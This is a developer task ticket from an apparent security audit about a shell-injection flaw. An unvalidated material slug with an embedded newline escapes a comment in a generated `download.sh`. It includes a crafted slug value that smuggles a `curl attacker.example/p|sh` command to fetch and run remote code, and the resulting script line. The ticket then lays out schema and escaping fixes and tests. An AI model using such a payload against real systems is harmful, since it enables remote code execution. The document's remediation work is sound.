# Task 62 — A material slug can run commands in `download.sh`

## Context

From the 2026-09-20 audit. **Reproduced end to end.**

`Material.slug` is declared with no character constraint at all
(`packages/schema/src/document.ts:43`):

```ts
slug: z.string().max(128).optional(),
```

Compare `AssetId` in the same file, which *is* regex-locked to
`^[A-Za-z0-9][A-Za-z0-9_./-]*$`. And **no lint rule references `slug`** — grep
across all seven files in `packages/schema/src/lint/rules/` returns zero hits.
So the project's "an invalid document is never written and never loaded"
guarantee does not cover this field by either mechanism.

That slug reaches generated shell text. `assets/download-list.ts:355`:

```ts
...missing.map((m) => `# UNRESOLVED ${m.source}/${m.slug} — ${m.note}`),
```

An embedded newline ends the comment line and the remainder becomes a command.
A scene with

```json
{ "source": "ambientcg", "slug": "x\n$(curl attacker.example/p|sh) #" }
```

parses, lints clean, and can be persisted. `npm run assets` fails to resolve it
at the source API (`new URL()` silently strips the newline rather than throwing,
so nothing short-circuits), pushes the **original** string into `missing`, and
emits:

```bash
# UNRESOLVED ambientcg/x
$(curl attacker.example/p|sh) # — not found (HTTP 404)
```

`bash assets-src/download.sh` — the documented next step in the README — then
executes it. Confirmed in an isolated scratch script: the crafted slug created a
marker file via `$(touch …)`.

**Why this is in scope rather than paranoia.** `decisions.md` states documents
are AI-authored, and that is the stated reason the linter exists at all. A slug
containing a newline, a quote or a `$(` is a realistic garbling, not only an
attack. The same under-validation corrupts the generated script benignly: a slug
with a space or a quote breaks `mkdir -p "${dir}"` and the single-quoted
`-name '${r.slug}.png'` in the `find` line too.

## Files you OWN

- `packages/schema/src/document.ts` — the `Material.slug` declaration
- `packages/schema/test/document.test.ts`
- `assets/download-list.ts` — the script assembly
- `assets/test/download-script.test.ts`

## Files you must NOT touch

- `AssetId`'s existing regex — it is correct; match its strictness, do not
  redefine it.
- The decision that downloads are done by hand via a generated script. The fix
  is to make the generated script safe, not to replace it with a downloader.

## What to do

1. **Constrain `slug` at the schema.** A source slug is a library identifier;
   the same character class `AssetId` already uses is the right shape. This is
   the primary fix and it is additive-with-no-default, so per
   `decisions-scene.md` it does **not** bump `schemaVersion` — but confirm no
   bundled scene breaks.
2. **Defend the sink as well.** The schema is one layer and `download-list.ts`
   reads whatever is on disk. Either refuse to emit a line for a slug that does
   not match, or escape it so it cannot leave its context. Do not rely solely on
   the schema — the file is run by `node` directly against `.scene.json` files.
3. Add a test that a slug containing a newline, a quote and a `$(` is rejected
   by the schema, **and** a test that the generated script is still a single
   comment line if such a string somehow reaches the generator.
4. Check the `fetchable` branch too, not only `missing` — `mkdir -p "${dir}"`
   and `find … -name '${r.slug}.png'` interpolate the slug into quoted contexts
   that a `"` or `'` escapes.

## Acceptance

- A scene document with a newline in a material slug fails `SceneDocument.parse`.
- Even given such a slug directly, the generated `download.sh` contains no
  executable line derived from it — asserted by running the generated script
  under `bash` in a temp dir and confirming no side effect.
- The bundled scenes still build and `npm run assets` still produces the same
  download list as before.
- `npm run check` exits 0.
